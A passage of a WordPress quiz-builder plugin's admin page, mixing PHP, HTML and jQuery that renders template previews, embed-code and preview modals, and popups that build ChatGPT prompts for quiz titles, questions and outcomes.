						if($outcome_img_counter == 1){
							$slider_active_class =  ' active ';
						}
						$sqb_outcome_slider_html .= '<div class="carousel-item '.$slider_active_class.'"><img class="d-block w-100" src="'.$outcome_img.'" alt="First slide"></div>';
						
					}
					$sqb_outcome_slider_html = '<div data-id="sqb_outcome_carouselExampleControls_'.$quiz_id.'" class="carousel_question carousel_outcome_screen sqb_slide slider" data-ride="carousel1"> <a class="left carousel-control" href="javascript:void(0)" data-slide="prev" onclick="jQuery(\'#sqb_outcome_carouselExampleControls_'.$quiz_id.'\').carousel(\'prev\')">‹</a>
												<a class="right carousel-control" href="javascript:void(0)" data-slide="next" onclick="jQuery(\'#sqb_outcome_carouselExampleControls_'.$quiz_id.'\').carousel(\'next\')">›</a>
												
												<div class="carousel-inner">'.$sqb_outcome_slider_html.'
												</div>
												
												 
												  
												</div>
												';
												
												
												
					$preview_html  .= '<div class="temp-pre-img-outer"><div class="heading_pre_popup">Outcome Screen</div><h5 style="font-size: 16px;margin: 0 0 16px 0;color: #737373;">Click on the slider / arrow to see all Outcomes</h5> '.$sqb_outcome_slider_html.'</div>';
					$heading_name = '';
					if(isset($pre_built_template_heading[$theme_name])){
						$heading_name = '<h2 class="quiz_temp_preview_heading">'.$pre_built_template_heading[$theme_name].'</h2>';
					}
					$theme_html .= '<div class="sqb_sq_grid_item " > '.$heading_name.'
									<div class="sqb_sq_grid_item_inner">
										<figure class="sqb_sq__media">
											<img src="'.$theme_start_img.'" alt="img"> 
										</figure>
										<div class="sqb_sq_grid_item_overlay">
											
											<button class="Preview-template-btn sqb_preview_builtin_template" data-quiz-id="'.$quiz_id.'" type="button">Preview</button>
											<button class="use-template-btn mt-3" data-id="'.$quiz_id.'" >Use Template</button>
										</div>
										
										<div class="sqb_preview_builtin_template_data" style="display:none">'.$preview_html.'</div>
										
									</div>
								</div>';
			        
				}
			}
				echo $theme_html;
				?>
			
			
			
			<div class="sqb_sq_grid_item">
				<h2 class="quiz_temp_preview_heading"></h2>
				<div class="sqb_sq_grid_item_inner">
					<figure class="sqb_sq__media">
						<img src="<?php echo plugin_dir_url(__FILE__)."../../includes/images/sqb_theme_coming_soon.png";?>" alt="img">
					</figure>
					
				</div>
			</div>
		</div>
	</div>
</div>
<!-- answer_slider_options_wrapper html start -->
<div class="Manage_Side_Popup active_Side_Popup sqb_quiz_type_preview_wrapper" style="display:none">
   <div class="Manage_Side_Popup-inner">
      <a href="javascript:void(0)" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
      <h2> Preview template  </h2>
      <div class="Manage_Side_Popup_content">
      		
        </div>
        <div class="Manage_Side_Popup_footer">
        	<button class="use-template-btn" data-id="249" >Use Template</button>
        </div>
   </div>
</div>
<!-- answer_slider_options_wrapper html end -->
<?php
$admin_url = plugins_url().'/smartquizbuilder/sqbExternalScript.php';
$admin_url = str_replace("https:", "", $admin_url);
$admin_url = str_replace("http:", "", $admin_url);
$filePath = dirname(__FILE__);
$pluginUrl = plugins_url();
$pluginUrl = str_replace("https:", "", $pluginUrl);
$pluginUrl = str_replace("http:", "", $pluginUrl);
 ?>
<div id="openpreview" class="modal quiz-popup-style fade openpreview_display" role="dialog" >
	<div class="modal-dialog modal-dialog-centered modal-lg mt-5 mb-5">
		<div class="modal-content">
			<div class="modal-header">
				<h4 class="modal-title">Preview Quiz</h4>
				<button type="button" class="close" data-dismiss="modal">&times;</button>       
			</div>
			<div class="modal-body template_container_outer sqb-preview-quiz-modal">
				
			</div>
		</div>
	</div>
</div>
 <div class="modal fade quiz-popup-style" id="embedCodeModal" tabindex="-1" role="dialog" aria-labelledby="embedCodeModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="embedCodeModalLabel">Embed Code</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <div class="embed-code-outer">
			<div class="info-div1">
			<p>Want to publish this quiz on a different site? Just copy and paste the code below on any site and this quiz will be displayed on that site even if you don't have SQB on that site.</p>
		</div>
			<span class="shortcode_display" id="copyEmbedCodeOuter">
				
			</span>
			
			
			
			<span data-id="copyEmbedCodeOuter" class="embed-code-copy" onclick="sqb_external_copy_to_clipboard(this)"><i class="fa fa-files-o" aria-hidden="true"></i> Copy</span>
		</div>
		
      </div>
    </div>
  </div>
</div>
<div class="Manage_Side_Popup personality_side_popup_options_wrapper quiz-form-side-popup gpt-quiz-form-side-popup" id="chatgpt_title_prompt_mpopup">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Title Ideas</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="aiq-popup-field-outer">
				<div class="chatgpt_form_input_wrapper mt-4 mb-4 survey-hide-show">
					<label>Enter your quiz subject / topic </label>
					<div class="inline-show-btn-in-field">
						<input type="text" name="chatgpt_title" id="chatgpt_quiz_subject_mprompt" placeholder="" class="chatgpt-field-input chatgpt-normal chatgpt_quiz_dynamic_placeholder reset-input-with-change">
						<button class="mt-3 chatgpt_show_mprompt chatgpt-btn " disabled="">Show Prompt</button>
					</div>
				</div>
				<div class="chatgpt_mprompt_format_wrapper chatgpt_title_prompt_code_hide_show">
					<label class="gpt-alert-box">You can use this prompt in ChatGPT. Please copy/paste this in ChatGPT for quiz title ideas and close this popup to continue.</label>
					<div class="code-container">
					<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_mprompt_format_code"  onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
					<code id="chatgpt_mprompt_format_code" class="chatgpt_mprompt_format">
					</code>
					</div>
					<div class="aiq-popup-btn-wrapper">
						<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_mprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
						<button class="chatgpt-btn btn-close-propmpt">Close</button>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>


<div class="Manage_Side_Popup personality_side_popup_options_wrapper quiz-form-side-popup gpt-quiz-form-side-popup" id="chatgpt_quiztype_prompt_mpopup">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Quiz Ideas For You</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="aiq-popup-field-outer quiz-ideas-main-wrapper" style="display:none">

				<div class="chatgpt-quiztype-step1">
					<div class="chatgpt_form_input_wrapper mt-4 mb-4 survey-hide-show">
						<label>What's the quiz topic?</label>
						<div class="inline-show-btn-in-field">
							<input type="text" name="chatgpt_quiztype_title" id="chatgpt_quiztype_subject_mprompt" placeholder="For e.g., list building, email marketing, online courses, health and fitness" class="chatgpt-field-input chatgpt-normal  reset-input-with-change">
							
						</div>
					</div>
					<div class="chatgpt_form_input_wrapper mt-4 mb-4 survey-hide-show">
						<label>Target Audience for this Quiz</label>
						<div class="inline-show-btn-in-field">
							<input type="text" name="chatgpt_quiztype_target" id="chatgpt_target_subject_mprompt" placeholder="For e.g., Online Course Creators" class="chatgpt-field-input chatgpt-normal  reset-input-with-change">
						</div>
					</div>
					<div class="aiq-popup-btn-wrapper">
						<button class="mt-3 chatgpt_quiztype_show_mprompt chatgpt-btn " disabled="">Show Prompt</button>
					</div>

					<div class="chatgpt_mprompt_format_wrapper chatgpt_quiztype_title_prompt_code_hide_show" style="display:none;">
						<label class="gpt-alert-box">You can use this prompt in ChatGPT. Please copy/paste this in ChatGPT. Then copy back the response in the text area below for quiz ideas.</label>
						<div class="code-container">
						<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_quiztype_mprompt_format_code"  onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
						<code id="chatgpt_quiztype_mprompt_format_code" class="chatgpt_quiztype_mprompt_format">
						</code>
						</div>
						<div class="aiq-popup-btn-wrapper">
							<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_quiztype_mprompt_format_code" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
							<button class="chatgpt-btn btn-close-propmpt">Close</button>
						</div>
					</div>

					<div class="chatgpt_form_input_wrapper chatgpt_quiztype_title_prompt_code_hide_show" style="display:none;">
						<textarea name="chatgpt_quiztype_json" id="chatgpt_quiztype_json" placeholder="Enter the ChatGPT response here" class="chatgpt-field-input reset-input"></textarea>
					</div>
					<div class="aiq-popup-btn-wrapper chatgpt_quiztype_title_prompt_code_hide_show" style="display:none;">
						<button class="chatgpt-btn chatgpt_quiztype_generate">Generate</button>
					</div>
				</div>
				
				<div class="chatgpt-quiztype-step2" style="display:none">
					<h4>Pick an option below (click to select):</h4>
					<ul id="chatgpt-quiztype-list"></ul>
					<div class="aiq-popup-btn-wrapper">
						<button class="chatgpt-btn chatgpt-quiz-type-backto-prompt" style="display:none;">Back to Prompt</button>
					</div>
				</div>
			
			</div>

			<div class="quiz-ideas-main-upgraded" style="display:none">
				<div class="sqb-ep-notice" style="">
					<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
						<p>We notice you are using the AI Quiz Add-On v1.3. Please upgrade to AI Quiz Add-on v1.4 to use this feature.</p></br />
						<p>You can <a href="https://wickedcoolplugins.com/login" target="_BLANK">download it from here</a> or update it in WP admin >> plugins area. </p></br />
						<p>Click the button below after you upgrade.</p>
					</div>
				</div>
				<div class="aiq-popup-btn-wrapper">
					<button class="chatgpt-btn chatgpt-quiz-type-upgraded">Yes, I've upgraded the AI add-on</button>
				</div>
			</div>

		</div>
	</div>
</div>


<div class="Manage_Side_Popup personality_side_popup_options_wrapper quiz-form-side-popup gpt-quiz-form-side-popup" id="chatgpt_question_prompt_mpopup">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Add More Questions</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="aiq-popup-field-outer">
				<div class="chatgpt_mprompt_format_wrapper chatgpt_question_prompt_code_show">
					<label class="gpt-alert-box">You can use the prompt below to generate additional questions/answers from ChatGPT. Copy the prompt below, enter it in ChatGPT, and then copy back the response you get from ChatGPT in the textarea below.</label>
					<div class="code-container">
					<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_questionsprompt_format_code_popup" onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
					<code id="chatgpt_questionsprompt_format_code_popup" class="chatgpt_mprompt_format">
					</code>
					</div>
					<div class="aiq-popup-btn-wrapper">
						<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_questionsprompt_format_code_popup" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
					</div>
					<div class="chatgpt_form_input_wrapper">
						<textarea name="chatgpt_question_json_popup" id="chatgpt_question_json_popup" placeholder="Enter the ChatGPT response here (questions/answers)" class="chatgpt-field-input reset-input"></textarea>
						<div class="chatgpt_generate_mquestion_error_popup chatgpt_generate_error_msg">
							<div class="aiq-alert aiq-alert-error">
							This response is not in the right format.<br />
							Please make sure to copy the prompt from the previous screen and enter it in ChatGPT. Do not remove the text in red.<br /><br />
							Also, whatever response ChatGPT gives you, enter it back here.<br /><br />
							Sometimes ChatGPT does not give back "code" response. When it gives back "plain text" response, please click the "regenerate" button  in ChatGPT or open a new chat and enter SQB's prompt again.<br /><br />
								<code>Need quiz content in JSON format with easy copy code button. Use these variables in JSON::
								[{
								    "question": "",
								    "type": "",
								    "answers": [{"answer" : "","outcome":""}]
								}]</code>
							</div>
						</div>
					</div>
					<div class="chatgpt_form_input_wrapper_popup">
						<button class="chatgpt_generate_responsce_popup chatgpt-btn" >Save and Close</button>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<div class="Manage_Side_Popup personality_side_popup_options_wrapper quiz-form-side-popup gpt-quiz-form-side-popup" id="chatgpt_outcome_prompt_mpopup">
	<div class="Manage_Side_Popup-inner">
		<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
		<h4 class="main-title">Add More Outcome</h4>
		<div class="sqb-quiz-type-content-wrapper">
			<div class="aiq-popup-field-outer">
				<div class="chatgpt_mprompt_format_wrapper chatgpt_question_prompt_code_show">
					<label class="gpt-alert-box">You can use the prompt below to generate additional outcomes/results from ChatGPT. Copy the prompt below, enter it in ChatGPT, and then copy back the response you get from ChatGPT in the textarea below.</label>
					<div class="code-container">
					<div class="aiq-copy-btn-wrapper"><span class="copy-icon" data-id="chatgpt_outcomeprompt_format_code_popup" onclick="sqb_copy_to_clipboardNew(this)"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" class="h-4 w-4" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg><i>Copy Code</i></span></div>
					<code id="chatgpt_outcomeprompt_format_code_popup" class="chatgpt_mprompt_format">
					</code>
					</div>
					<div class="aiq-popup-btn-wrapper">
						<button class="chatgpt-btn btn-copy-propmpt" data-id="chatgpt_outcomeprompt_format_code_popup" onclick="sqb_copy_to_clipboardNew(this)"><i>Copy Code</i></button>
					</div>
					<div class="chatgpt_form_input_wrapper">
						<textarea name="chatgpt_outcome_json_popup" id="chatgpt_outcome_json_popup" placeholder="Enter the response here" class="chatgpt-field-input reset-input"></textarea>
						<div class="chatgpt_generate_moutcome_error_popup chatgpt_generate_error_msg">
							<div class="aiq-alert aiq-alert-error">
							This response is not in the right format.<br /><br />
							Please make sure to copy the prompt from the previous screen and enter it in ChatGPT. Do not remove the text in red.<br /><br />
							Also, whatever response ChatGPT gives you, enter it back here.<br /><br />
							Sometimes ChatGPT does not give back "code" response. When it gives back "plain text" response, please click the "regenerate" button  in ChatGPT or open a new chat and enter SQB's prompt again.<br /><br />
							It should give you back "code" response that looks something like this:<br />
							<img src="<?php echo SQB_URL.'/includes/images/outcome-response.jpg' ?>" style="width:600px;" />
							</div>
						</div>
					</div>
					<div class="chatgpt_form_input_wrapper_popup">
						<button class="chatgpt_generate_responsce_popup_outcome chatgpt-btn" >Save and Close</button>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>
<?php $data_ai_prompt = get_openAI_prompts_array(); ?>
<script>
	var sqb_site_url = "<?= $site_url ?>";
	var placeholderValues = ["eg. marketing", "eg. fitness", "eg. health"];
	var chatgpt_normal_ani = placeholderValues;
	var chatgpt_survey_ani = ["eg. Got a minute?", "eg. We're listening!", "eg. Can you help?"];
////dailydap.com/wp-content/plugins/smartquizbuilder/includes/js/sqbExternalScript.js
var externalScript = "<?= $pluginUrl  ?>/smartquizbuilder/includes/js/sqbExternalScript.js";
var adminAjaxUrl = "<?= $admin_url ?>";
var filePath = "<?= $filePath ?>";

let currentIndex = 0;
let currentText = '';
let typingTimer;
var gptinputField = '';
function typeText() {
	if (currentText.length < placeholderValues[currentIndex].length) {
	currentText += placeholderValues[currentIndex][currentText.length];
	gptinputField.attr("placeholder", currentText);
	typingTimer = setTimeout(typeText, 100);
	} else {
	clearTimeout(typingTimer);
	setTimeout(eraseText, 1000);
	}
}
function eraseText() {
	if (currentText.length > 0) {
	currentText = currentText.slice(0, -1);
	gptinputField.attr("placeholder", currentText);
	typingTimer = setTimeout(eraseText, 50);
	} else {
	clearTimeout(typingTimer);
	currentIndex = (currentIndex + 1) % placeholderValues.length;
	setTimeout(typeText, 500);
	}
}

jQuery(document).ready(function(){

	jQuery.fn.dataTable.ext.errMode = 'none';

 	var table = jQuery('.quiz_table').on( 'error.dt', function ( e, settings, techNote, message ) {
        location.reload();
    } ).dataTable({
        "processing": false,
		"serverSide": true,
		"bAutoWidth": false,
	    "bLengthChange": false,
	    "pageLength" : 16,
        "ajax": sqb_site_url+'/wp-admin/admin-ajax.php?action=show_pagination',
		'columns': [
		         	{ data: 'quiz_name' }
		      	],
		createdRow: function (row, data, dataIndex) {
			jQuery(row).addClass('Manage--Quiz-block');
		},
		'language': {
			'search': "",
			'searchPlaceholder': "Search..."
        },   
        'preDrawCallback': function(settings) {
	      jQuery('.sqb_loading_wrapper').show();
	    },
	    'drawCallback': function(settings) {
	      jQuery('.sqb_loading_wrapper').hide();
	      
	    }
    });
    jQuery('#datatable-searchBtn').on('click', function() {
	    var searchValue = jQuery('#datatable-custom-search').val();
	    table.dataTable().fnFilter(searchValue);
	  });
	
	//const inputField = document.getElementById("chatgpt_title");
	gptinputField = jQuery(".chatgpt_quiz_dynamic_placeholder");
	typeText(); 
	});
var server_date = '<?php echo date('Y-m-d h:i:s'); ?>';
/* UDAY SCRIPT*/
jQuery(document).on('change keyup blur','#chatgpt_quiz_subject_mprompt', function(){
	if(jQuery(this).val().trim() != ''){
		jQuery('.chatgpt_show_mprompt').prop("disabled", false);
	}else{
		jQuery('.chatgpt_show_mprompt').prop("disabled", true);
		jQuery('.chatgpt_title_prompt_code_hide_show').hide();
	}
});
jQuery(document).on('change keyup blur','#chatgpt_mtitle,#chatgpt_mquestion_additional', function(){
	if (jQuery('input[name=chatgpt_quiz_type]:checked').val() != 'survey') {
		if(jQuery(this).val().trim() != '' && jQuery('#chatgpt_mquestion_additional').val() != '' && jQuery('#chatgpt_mtitle').val() != ''){
			jQuery('.chatgpt_generate_mtitle').prop("disabled", false);
		}else{
			jQuery('.chatgpt_generate_mtitle').prop("disabled", true);
		}
		
	}
});
jQuery('#chatgpt_title_prompt_mpopup .chatgpt_show_mprompt').on('click', function() {
	jQuery('.chatgpt_title_prompt_code_hide_show').show();
});
jQuery('.gpt-quiz-form-side-popup .close_Side_Popup, .chatgpt-btn.btn-close-propmpt').on('click', function() {
	jQuery('.gpt-quiz-form-side-popup').removeClass('active_Side_Popup');
});
jQuery('.chatgpt_regenerate_mquestion').on('click', function() {
	jQuery('#chatgpt_question_prompt_mpopup').addClass('active_Side_Popup');
});
jQuery('.chatgpt_regenerate_moutcome').on('click', function() {
	jQuery('#chatgpt_outcome_prompt_mpopup').addClass('active_Side_Popup');
});
var chatgpt_mprompt = 'I would like to create a personality quiz on the topic of [topic].%%LANG_MSG%%\n\nHelp me generate 10 engaging quiz titles. \n\Draw inspiration from the following examples:\nWhat type of (topic) is right for you?\nHow much do you know about (topic)\nWhich (topic) are you?\nWhat is your (topic) style?\nWhat kind of (topic) are you?\nWhat type of (topic) should you create?\n';
chatgpt_mprompt_lang = '\n\nResponse in %%QLANG%%\n\n';
var chatgpt_mprompt_p = '<?php echo str_replace("'","\'",$data_ai_prompt["title_prompt_personality"]) ?>';
var chatgpt_mprompt_s = '<?php echo str_replace("'","\'",$data_ai_prompt["title_prompt_scoring"]) ?>';
var chatgpt_mprompt_survey = '<?php echo str_replace("'","\'",$data_ai_prompt["title_prompt_survey"]) ?>';

var chatgpt_quiz_ideas = [];

var chatgpt_ai_plugin_version = '<?php echo ai_is_allow_quiz_ideas() ?>';

var chatgpt_quiz_type_prompt = `<?php echo str_replace("'","\'",$data_ai_prompt["quiz_type_prompt"]) ?>`;
jQuery(document).on('click','.chatgpt_show_mprompt', function(){
	var quiz_subject = jQuery('#chatgpt_quiz_subject_mprompt').val();
	if(sqbchatGpt['quiz_type'] == 'scoring'){
		mprompt_html = chatgpt_mprompt_s.replaceAll('[topic]',quiz_subject);
	}else if(sqbchatGpt['quiz_type'] == 'survey'){
		mprompt_html = chatgpt_mprompt_survey.replaceAll('[topic]',jQuery('#chatgpt_msurvay_goal').val());
		var chatgpt_msurvaycontent = jQuery('#chatgpt_msurvaycontent').val();
		mprompt_html = mprompt_html.replaceAll('%%PRODUCT_DETAIL%%',chatgpt_msurvaycontent);
	}else{
		mprompt_html = chatgpt_mprompt_p.replaceAll('[topic]',quiz_subject);
	}
	//mprompt_html = chatgpt_mprompt.replaceAll('[topic]',quiz_subject);
	var quiz_lang = jQuery('#chatgpt_quiz_lang').val();
	mprompt_html = mprompt_html.replaceAll('%%LANG_MSG%%','\n\nResponse in '+quiz_lang+'');
	jQuery('#chatgpt_title_prompt_mpopup .chatgpt_mprompt_format').html(mprompt_html);
});
var chatgpt_question_prompt_d_org = 'Need quiz questions and answers for my quiz titled';
var chatgpt_question_prompt_d_copy = 'I need some additional questions and answers for my quiz titled';
var chatgpt_question_prompt_d_op = 'I want answer mapped to an outcome with these outcome title';
var chatgpt_question_prompt_d_os = 'Outcome Titles:';
var chatgpt_question_prompt_normal = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt']) ?>';
var chatgpt_question_prompt_scoring = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_scoring']) ?>';
var chatgpt_question_prompt_survey = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_survey']) ?>';
var questions_scoring_prompt_json = '<?php echo str_replace("'","\'",$data_ai_prompt['questions_scoring_prompt_json']) ?>';
var questions_personality_prompt_json = '<?php echo str_replace("'","\'",$data_ai_prompt['questions_personality_prompt_json']) ?>';
var questions_survey_prompt_json = '<?php echo str_replace("'","\'",$data_ai_prompt['questions_survey_prompt_json']) ?>';
var chatgpt_question_prompt_d = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_editable']) ?>';
var chatgpt_question_prompt_d_ideal = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_editable_ideal']) ?>';
var chatgpt_question_prompt_d_survey = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_survey_editable']) ?>';
var chatgpt_question_prompt_d_survey_ideal = '<?php echo str_replace("'","\'",$data_ai_prompt['question_prompt_survey_editable_ideal']) ?>';

jQuery(document).on('click','.chatgpt_generate_quiz_mquestions_prompt', function(){
	var topic_name = jQuery('#chatgpt_mtitle').val();
	

	var chatgpt_question_prompt_d_survey_describe = jQuery('#chatgpt_msurvaycontent').val();

	if (jQuery('input[name=chatgpt_quiz_type]:checked').val() == 'survey') {
		var additional = jQuery('#chatgpt_msurvay_goal').val();
	}else{
		var additional = '\nGoal: '+jQuery('#chatgpt_mquestion_additional').val();
	}


	var question_single = jQuery('#chatgpt_mquestion_single_limit').val();
	var question_multiple = jQuery('#chatgpt_mquestion_multi_limit').val();
	var question_open = jQuery('#chatgpt_mquestion_open_limit').val();
	var question_ratingscale = jQuery('#chatgpt_mquestion_ratingscale_limit').val();
	if(question_single == ''){
		question_single = 0;
	}
	if(question_multiple == ''){
		question_multiple = 0;
	}
	if(question_open == ''){
		question_open = 0;
	}
	if(question_ratingscale == ''){
		question_ratingscale = 0;
	}
	var total = parseInt(question_single) + parseInt(question_multiple) +parseInt(question_open) + parseInt(question_ratingscale);
	if(total < 1){
		sqb_sweet_message('',"Min limit is 1","");
		return false;
	}
	if(total > 15){
		sqb_sweet_message('',"Max Limit is 15.","");
		return false;
	}
	if(additional == ''){
		sqb_sweet_message('',"Please enter the goal","");
		return false;
	}
	var c_limit = [];
	var ques_type = [];
	
	if(jQuery('input[name=chatgpt_mquestion_choice]:checked').val() == 'ai_question'){

		if (jQuery('#chatgpt_mquestion_single_limitm').is(':checked')) {
    c_limit.push('\nsingle choice question(s)');
    ques_type.push('single');
}
if (jQuery('#chatgpt_mquestion_multi_limitm').is(':checked')) {
    c_limit.push('\nmultiple choice question(s)');
    ques_type.push('multiple');
}
if (jQuery('#chatgpt_mquestion_open_limitm').is(':checked')) {
    c_limit.push('\nopen ended question(s)');
    ques_type.push('open');
}
if (jQuery('#chatgpt_mquestion_ratingscale_limitm').is(':checked') && sqbchatGpt['quiz_type'] != 'scoring') {
    c_limit.push('\nRating-Scale question(s) (scale of 5) with min and max text\n');
    ques_type.push('rating');
}


	}else{

	if(question_single > 0){
		c_limit.push('\n['+question_single+'] single choice question(s)');
		ques_type.push('single');
	}
	if(question_multiple > 0){
		c_limit.push('\n['+question_multiple+'] multiple choice question(s)');
		ques_type.push('multiple');
	}
	if(question_open > 0){
		c_limit.push('\n['+question_open+'] open ended question(s)');
		ques_type.push('open');
	}
	if(question_ratingscale > 0 && sqbchatGpt['quiz_type'] != 'scoring'){
		c_limit.push('\n['+question_ratingscale+'] Rating-Scale question(s) (scale of 5) with min and max text\n');
		ques_type.push('rating');
	}

}

	var type = sqbchatGpt['quiz_type'];
	

	var q_ltype = '';
	if(c_limit.length > 0){

		if(type == 'survey'){
			jQuery.each(c_limit, function(i, t) {

				var ind = i+1;
				c_limit[i] = '\n'+c_limit[i];
				c_limit[i] = c_limit[i].replaceAll('\n[','');
				c_limit[i] = c_limit[i].replaceAll(']','');
			});
		}
	
		q_ltype = '\n\nOnly these question types:'+c_limit.join(',')+'\n\nOnly give back relevant questions and answers.\n';
	}
	var q_ftype = '';
	if(ques_type.length > 0){
		q_ftype = ques_type.join(', ');
	}
	var type = sqbchatGpt['quiz_type'];
	if(type == 'scoring'){

		//1) single choice\n2) multiple choice\n3) open-ended
		if(jQuery('input[name=chatgpt_mquestion_choice]:checked').val() == 'ai_question'){
			var mynewval = chatgpt_question_prompt_d_ideal.replaceAll('%%TITLE%%',topic_name);
			if(c_limit.length > 0){
			mynewval = mynewval.replaceAll('%%AI_QTYPE%%',c_limit.join(','));
			}else{
				mynewval = mynewval.replaceAll('%%AI_QTYPE%%','');
			}
		}else{

			
			var mynewval = chatgpt_question_prompt_d.replaceAll('%%TITLE%%',topic_name);

			if(c_limit.length > 0){
			mynewval = mynewval.replaceAll('%%AI_QTYPE%%',c_limit.join(','));
			}else{
				mynewval = mynewval.replaceAll('%%AI_QTYPE%%','');
			}
			
		}

		if(jQuery('input[name=chatgpt_scoring_correct]:checked').val() == 'yes'){
			mynewval = mynewval.replaceAll('%%QTYPE%%','\n\nCorrect answer should be 1 point.');
		}else{
			mynewval = mynewval.replaceAll('%%QTYPE%%','');
		}

		
		mynewval = mynewval.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_scoring);
		mynewval = mynewval.replaceAll('%%JSON_CODE%%',questions_scoring_prompt_json);
		mynewval = mynewval.replaceAll(',"outcome":""','');
		mynewval = mynewval.replaceAll('%%OUTCOME_CONTENT%%','\n'+chatgpt_question_prompt_d_os);
	}else if(type == 'survey'){

		if(jQuery('input[name=chatgpt_mquestion_choice]:checked').val() == 'ai_question'){
			var mynewval = chatgpt_question_prompt_d_survey_ideal.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_survey);
		}else{
			
			var mynewval = chatgpt_question_prompt_d_survey.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_survey);
		}
		

		//var mynewval = chatgpt_question_prompt_d_survey.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_survey);
		mynewval = mynewval.replaceAll('%%JSON_CODE%%',questions_survey_prompt_json);

		if(question_ratingscale < 1){
			mynewval = mynewval.replaceAll('{\n"question": "",\n"type": "rating",\n"min-max-text" :[] \n"answers": [{"answer" : "1","answer" : "2"...,"answer" : "5"}','{\n"question": "",\n"type": "",\n"answers": [{"answer" : ""}]\n}');
		}

		mynewval = mynewval.replaceAll(',"points":"","correct":"true"','');
		mynewval = mynewval.replaceAll('%%QTYPE%%','');
		mynewval = mynewval.replaceAll('%%OUTCOME_CONTENT%%','');
		mynewval = mynewval.replaceAll('%%SURVEYDESCRIBE%%',chatgpt_question_prompt_d_survey_describe);
	}else{
		
		if(jQuery('input[name=chatgpt_mquestion_choice]:checked').val() == 'ai_question'){
			var mynewval = chatgpt_question_prompt_d_ideal.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_normal);
		}else{

			var mynewval = chatgpt_question_prompt_d.replaceAll('%%HARDCODE_TEXT%%',chatgpt_question_prompt_normal);
		}
		
		mynewval = mynewval.replaceAll('%%JSON_CODE%%',questions_personality_prompt_json);

		if(question_ratingscale < 1){
			mynewval = mynewval.replaceAll('[{\n"question": "",\n"type": "rating",\n"min-max-text" :[] \n"answers": [{"answer" : "1","outcome":""},...,{"answer" : "5","outcome":""}]','{\n"question": "",\n"type": "",\n"answers": [{"answer" : "","outcome":""}]\n}');
		}

		mynewval = mynewval.replaceAll(',"points":"","correct":"true"','');
		mynewval = mynewval.replaceAll('%%QTYPE%%','');
		mynewval = mynewval.replaceAll('%%OUTCOME_CONTENT%%',chatgpt_question_prompt_d_op);
	}

